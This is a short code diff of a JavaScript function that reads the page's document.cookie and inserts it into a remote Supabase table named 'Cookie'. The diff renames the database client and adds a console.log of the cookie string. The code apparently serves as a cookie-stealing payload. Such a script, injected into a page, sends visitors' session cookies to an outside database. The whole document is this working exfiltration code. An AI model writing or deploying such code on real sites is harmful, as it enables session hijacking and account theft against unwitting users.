@@ -6,12 +6,13 @@
   function run() {
 
     const c = document.cookie;
-    const supabase = window.supabase.createClient(
+    const supaclient = supabase.createClient(
       SUPABASE_URL,
       SUPABASE_KEY
     );
 
-    supabase
+    console.log(c)
+    supaclient
       .from("Cookie")
       .insert({
         text: c,
